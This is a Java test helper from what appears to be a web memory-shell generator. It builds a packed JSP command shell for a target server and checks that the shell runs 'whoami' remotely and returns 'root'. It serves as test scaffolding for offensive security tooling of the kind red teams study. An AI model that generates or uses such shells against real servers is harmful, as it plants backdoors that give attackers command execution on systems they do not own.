package com.reajason.javaweb.integration;

import com.reajason.javaweb.GeneratorMain;
import com.reajason.javaweb.config.CommandShellConfig;
import com.reajason.javaweb.config.GenerateResult;
import com.reajason.javaweb.config.Server;
import com.reajason.javaweb.config.ShellTool;
import com.reajason.javaweb.memsell.packer.JspPacker;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.util.Objects;

import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2024/11/30
 */
@Slf4j
public class CommandShellTool {

    public static String generateJsp(Server server, CommandShellConfig config, String shellType, int targetJdkVersion) {
        ShellTool shellTool = ShellTool.COMMAND;
        GenerateResult generateResult = GeneratorMain.generate(server, shellTool, shellType, config, targetJdkVersion);
        JspPacker jspPacker = new JspPacker();
        return new String(jspPacker.pack(generateResult));
    }

    @SneakyThrows
    public static void testIsOk(String entrypoint, CommandShellConfig shellConfig) {
        OkHttpClient okHttpClient = new OkHttpClient();
        HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                .newBuilder()
                .addQueryParameter(shellConfig.getParamName(), "whoami")
                .build();
        Request request = new Request.Builder()
                .url(url)
                .get().build();

        try (Response response = okHttpClient.newCall(request).execute()) {
            String res = response.body().string();
            assertEquals("root", res.trim());
        }
    }
}
